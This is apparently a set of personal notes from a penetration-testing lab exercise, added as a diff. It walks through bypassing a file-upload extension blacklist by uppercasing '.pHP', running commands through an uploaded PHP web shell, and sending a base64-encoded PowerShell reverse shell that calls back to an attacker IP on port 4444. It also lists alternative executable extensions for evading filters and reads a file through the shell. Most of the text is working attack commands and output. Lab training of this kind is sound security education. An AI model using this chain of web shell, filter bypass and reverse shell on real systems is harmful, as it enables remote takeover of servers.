@@ -1,1 +1,160 @@
+Let's find out if we can upload a text file instead of an image.
+
+kali@kali:~$ echo "this is a test" > test.txt
+Create a test text file
+
+Image
+Image Upload? Test a .txt file. Then try simple-backdoor.php
+We successfully uploaded our text file, so we know that the upload mechanism is not limited to images only. 
+Next, attempt to upload a simple-backdoor.php webshell
+
+The web application blocked our upload, stating that PHP files are not allowed and files with PHP file extensions are blacklisted. 
+Since we don't know exactly how the filter is implemented, we'll use a trial-and-error approach to find ways to bypass it.
+
+try | .phps | .php7 
+
+PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
+ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
+Coldfusion: .cfm, .cfml, .cfc, .dbm
+Flash: .swf
+Perl: .pl, .cgi
+Erlang Yaws Web Server: .yaws
+
+
+One method to bypass this filter is to change the file extension to a less-commonly used PHP file extension such as .phps or .php7. 
+This may allow us to bypass simple filters that only check for the most common file extensions, .php and .phtml. 
+These alternative file extensions were mostly used for older versions of PHP or specific use cases, but are still supported for compatibility in modern PHP versions.
+
+Another way we can bypass the filter is by changing characters in the file extension to upper case. 
+The blacklist may be implemented by comparing the file extension of the uploaded file to a list of strings containing only lower-case PHP file extensions. 
+If so, we can update the uploaded file extension with upper-case characters to bypass the filter.
+
+Let's try the second method, updating our simple-backdoor.php file extension from .php to .pHP. 
+After renaming the file either in the terminal or file explorer, we'll upload it via the web form.
+
+This small change allowed us to bypass the filter and upload the file. 
+The output shows that our file was uploaded to the "uploads" directory, so we can assume there is a directory named "uploads".
+
+Let's use curl to provide dir as a command for the "cmd" parameter of our uploaded web shell.
+
+kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
+
+ Directory of C:\xampp\htdocs\meteor\uploads
+
+04/04/2022  06:23 AM    <DIR>          .
+04/04/2022  06:23 AM    <DIR>          ..
+04/04/2022  06:21 AM               328 simple-backdoor.pHP
+04/04/2022  06:03 AM                15 test.txt
+               2 File(s)            343 bytes
+               2 Dir(s)  15,410,925,568 bytes free
+Execution of dir command in the uploaded webshell
+
+Now you can execute a base64encoded powershell reverse one-liner
+Listing 30 shows us the output of the dir command, confirming we can now execute commands on the target system. 
+Although this bypass was quick and basic, these kinds of bypasses are often highly effective.
+
+Obtaining a reverse shell from the target machine. 
+We'll start a Netcat listener in a new terminal to catch the incoming reverse shell on port 4444.
+
+kali@kali:~$ nc -nvlp 4444
+listening on [any] 4444 ...
+Starting Netcat listener on port 4444
+
+Let's use a PowerShell one-liner for our reverse shell. 
+Since there are several special characters in the reverse shell one-liner, we will encode the string with base64. 
+We can use PowerShell or an online converter to perform the encoding.
+
+In this demonstration, we'll use PowerShell on our Kali machine to encode the reverse shell one-liner. 
+First, let's create the variable $Text, which will be used for storing the reverse shell one-liner as a string. 
+Then, we can use the method convert and the property Unicode from the class Encoding to encode the contents of the $Text variable.
+
+kali@kali:~$ pwsh
+PowerShell 7.1.3
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+PS> $EncodedText =[Convert]::ToBase64String($Bytes)
+PS> $EncodedText
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
+...
+AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+PS> exit
+Encoding the oneliner in PowerShell on Linux
+
+As shown in Listing 32, the $EncodedText variable contains the encoded reverse shell one-liner. 
+Let's use curl to execute the encoded one-liner via the uploaded simple-backdoor.pHP. 
+We can add the base64 encoded string for the powershell command using the -enc parameter. 
+We'll also need to use URL encoding for the spaces.
+
+kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
+AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+Using curl to send the base64 encoded reverse shell oneliner
+
+we have abused a file upload mechanism in a PHP web application. 
+We achieved code execution by uploading a web shell from our Kali system. 
+If the target web application was using ASP instead of PHP, we could have used the same process to obtain code execution as we did in the previous example, instead uploading an ASP web shell. 
+Fortunately for us, Kali already contains a broad variety of web shells covering the frameworks and languages we discussed previously located in the /usr/share/webshells/ directory.
+
+It is important to understand that while the implementation of a web shell is dependent on the programming language, the basic process of using a web shell is nearly identical across these frameworks and languages. 
+After we identify the framework or language of the target web application, we need to find a way to upload our web shell. 
+The web shell needs to be placed in a location where we can access it. 
+Next, we can provide commands to it, which are executed on the underlying system.
+
+We should be aware that the file types of our web shells may be blacklisted via a filter or upload mechanism. 
+In situations like this, we can try to bypass the filter as in this section. 
+However, there are other options to consider. 
+Web applications handling and managing files often enable users to rename or modify files. 
+We could abuse this by uploading a file with an innocent file type like .txt, then changing the file back to the original file type of the web shell by renaming it.
+.txt upload then rename to the webshell type. 
+
+
+PS One-Liner
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.131",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $EncodedText =[Convert]::ToBase64String($Bytes)
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $EncodedText
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQAzADEAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> exit
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.131.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQAzADEAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+/var/www/html is the webroot 
+curl http://192.168.131.16/simple-backdoor.pHP?cmd=cat%20/opt/install.txt 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
